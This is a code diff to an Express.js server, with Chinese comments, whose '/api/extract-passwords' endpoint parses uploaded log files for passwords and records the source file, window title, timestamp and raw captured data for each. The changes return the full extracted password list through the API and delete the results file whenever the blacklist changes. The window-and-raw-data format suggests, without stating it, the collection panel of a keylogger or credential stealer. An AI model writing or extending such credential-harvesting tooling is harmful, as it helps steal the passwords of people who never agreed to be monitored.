@@ -2207,8 +2207,7 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         
         const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
         
-        if (logFiles.length === 0) return res.json({ success: true, count: 0 });
-
+        if (logFiles.length === 0) return res.json({ success: true, count: 0, passwords: [] });
         const currentFileStates = new Map();
     for (const file of logFiles) {
         const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
@@ -2235,7 +2234,15 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
 
     if (!needFullReextraction && extractionCache.passwords.length > 0) {
         logger.debug('缓存完全有效，直接返回密码提取结果');
-        return res.json({ success: true, count: extractionCache.passwords.length });
+        const passwordsWithIndex = extractionCache.passwords.map((item, index) => ({
+            ...item,
+            index: index + 1
+        }));
+        return res.json({
+            success: true,
+            count: extractionCache.passwords.length,
+            passwords: passwordsWithIndex
+        });
     }
 
     const filesToProcess = [];
@@ -2309,11 +2316,11 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
     const resultFilename = 'extracted_passwords.txt';
     const resultContent = uniquePasswords.map((item, index) => {
         return `${index + 1}. 来自: ${item.file}\n` +
-               `窗口: ${item.window || '未知'}\n` +
-               `时间: ${item.timestamp}\n` +
-               `内容: ${item.password}\n` +
-               `原始数据: ${item.rawPassword}\n`;
-    }).join('\n');
+            `窗口: ${item.window || '未知'}\n` +
+            `时间: ${item.timestamp}\n` +
+            `内容: ${item.password}\n` +
+            `原始数据: ${item.rawPassword}\n`;
+    }).join('\n\n'); 
 
     const logsDir = path.join(__dirname, 'logs');
     if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
@@ -2339,6 +2346,18 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         res.status(500).json({ success: false, error: '提取密码失败: ' + error.message });
     }
 }));
+
+async function clearExtractedPasswordFile() {
+    const filePath = path.join(__dirname, 'logs', 'extracted_passwords.txt');
+    try {
+        await fs.promises.unlink(filePath);
+        logger.debug('已删除旧的提取密码文件');
+    } catch (e) {
+        if (e.code !== 'ENOENT') {
+            logger.warn('删除提取密码文件失败', { error: e.message });
+        }
+    }
+}
 
 app.post('/api/blacklist/test', asyncHandler(async (req, res) => {
     const { password } = req.body;
@@ -2371,6 +2390,7 @@ app.post('/api/blacklist', asyncHandler(async (req, res) => {
     );
     // 更新缓存
     blacklistCache.set(passwordHash, normalizedPassword);
+    await clearExtractedPasswordFile();  
     logger.debug('添加黑名单: ' + normalizedPassword);
     // 使密码提取缓存失效
     extractionCache.fileMTimes.clear();
@@ -2378,7 +2398,6 @@ app.post('/api/blacklist', asyncHandler(async (req, res) => {
     logger.debug('黑名单已更新，密码提取缓存已清除');   
     // 清空密码列表
     extractionCache.passwords = [];
-    res.json({ success: true });
     res.json({ success: true });
 }));
 
@@ -2449,6 +2468,7 @@ app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
     
     // 从缓存中移除
     blacklistCache.delete(rows[0].password_hash);
+    await clearExtractedPasswordFile(); 
     logger.debug(`删除黑名单: ${normalizePassword(rows[0].password)}`);
     extractionCache.fileMTimes.clear();
     extractionCache.lastExtractTime = 0;
